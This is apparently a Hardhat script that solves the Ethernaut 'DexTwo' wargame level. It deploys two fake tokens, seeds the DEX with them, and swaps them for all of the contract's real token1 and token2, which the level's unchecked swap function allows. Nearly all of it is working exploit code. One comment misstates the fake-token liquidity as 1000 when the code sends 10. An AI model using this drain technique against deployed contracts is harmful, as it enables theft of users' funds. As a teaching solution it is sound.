/*
This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

  Things that might help:

How has the swap method been modified?
*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();
  
  console.log("Getting instances of the DEX & Real Tokens Contracts deployed by Ethernaut");

  // Get an instance of the DEX contract deployed by Ethernaut
  const DexTwoAddress = "0xC89938074A0c940B0bE15c3c9a5a4B21d75269D4"
  this.dexTwo = await hre.ethers.getContractAt("Dex",DexTwoAddress);

  // Get an instance of the Token1 contract deployed by Ethernaut
  const Token1Address = "0x5DAD7BDE8f7d6C0FA62d4d4358E21C7f520cCB0D"
  this.token1 = await hre.ethers.getContractAt("SwappableToken",Token1Address);

  // Get an instance of the Token2 contract deployed by Ethernaut
  const Token2Address = "0x11979CaDA2A76009aec603830078Fbf4ed18E018"
  this.token2 = await hre.ethers.getContractAt("SwappableToken",Token2Address);

  // Validate all the configurations on the DEX Contract were made properly before proceeding to deploy the Attacker contract
  expect(await this.token1.address).to.eq(await this.dexTwo.token1());
  expect(await this.token2.address).to.eq(await this.dexTwo.token2());

  expect(await this.dexTwo.balanceOf(this.token1.address,this.dexTwo.address)).to.eq(100);
  expect(await this.dexTwo.balanceOf(this.token2.address,this.dexTwo.address)).to.eq(100);

  // Validate the player has been funded with 10 tokens each
  expect(await this.token1.balanceOf(player.address)).to.eq(10);
  expect(await this.token2.balanceOf(player.address)).to.eq(10);

  console.log("\n\n Performing attack ... \n");
  console.log("Deploying the two fake tokens");
  // Deploying TokenFake1 contract
  const TokenFake1 = await hre.ethers.getContractFactory("SwappableToken");
  this.tokenFake1 = await TokenFake1.connect(player).deploy(this.dexTwo.address,"TokenFake1","TF1",1000);
  await this.tokenFake1.deployed();

  // Deploying TokenFake2 contract
  const TokenFake2 = await hre.ethers.getContractFactory("SwappableToken");
  this.tokenFake2 = await TokenFake2.connect(player).deploy(this.dexTwo.address,"TokenFake2","TF2",1000);
  await this.tokenFake2.deployed();

  // Transfer the 10 tokens of the FakeTokens to the DEX Contract
  console.log("Adding the required liquidity of the Fake Tokens into the DEX Contract to perform the attack");
  tx = await this.tokenFake1.connect(player).transfer(this.dexTwo.address,10);
  await tx.wait();
  console.log("Added successfully liquidity of FakeToken1");

  tx = await this.tokenFake2.connect(player).transfer(this.dexTwo.address,10);
  await tx.wait();
  console.log("Added successfully liquidity of FakeToken2");

  // At this point, the DexTwo contract has 1000 tokens of liquidity of each fake token
  // By doing the math, this liquidity is enough to drain all the 100 tokens of the good tokens by swapping only 10 of the good ones
  // (amount * balanceToToken) / balanceFromToken ====> (10 * 100) / 10 = 100
  // Where fromToken is the fakeToken & toToken is the real token!

  // Granting allowance to DexTwo contract to spend the fake tokens on behalf of the player
  tx = await this.tokenFake1.connect(player).increaseAllowance(this.dexTwo.address,10);
  await tx.wait();

  tx = await this.tokenFake2.connect(player).increaseAllowance(this.dexTwo.address,10);
  await tx.wait();

  expect(await this.dexTwo.balanceOf(this.tokenFake1.address,this.dexTwo.address)).to.eq(10);
  expect(await this.dexTwo.balanceOf(this.tokenFake2.address,this.dexTwo.address)).to.eq(10);

  expect(await this.tokenFake1.allowance(player.address,this.dexTwo.address)).to.eq(10);
  expect(await this.tokenFake2.allowance(player.address,this.dexTwo.address)).to.eq(10);


  console.log("\n===============================================\n===============================================\n");
  console.log("\n Swapping Fake Tokens for Real Tokens \n");

  console.log("Swapping FakeToken1 for Token2");
  let swapTX = await this.dexTwo.connect(player).swap(this.tokenFake1.address,this.token2.address,10);
  await swapTX.wait();

  console.log("Swapping FakeToken2 for Token1");
  swapTX = await this.dexTwo.connect(player).swap(this.tokenFake2.address,this.token1.address,10);
  await swapTX.wait();


  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  let dexToken1Balance = await this.dexTwo.balanceOf(this.token1.address,this.dexTwo.address)
  let dexToken2Balance = await this.dexTwo.balanceOf(this.token2.address,this.dexTwo.address)

  console.log(
    `
    Dex contract token1 balance: ${dexToken1Balance} \n
    Dex contract token2 balance: ${dexToken2Balance} \n

    Player token1 balance: ${await this.dexTwo.balanceOf(this.token1.address,player.address)} \n
    Player token2 balance: ${await this.dexTwo.balanceOf(this.token2.address,player.address)} \n
    `
  );

  if( dexToken1Balance > 0) throw new TypeError('The DEX Contract has still balance of Token1');
  if( dexToken2Balance > 0) throw new TypeError('The DEX Contract has still balance of Token2');

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});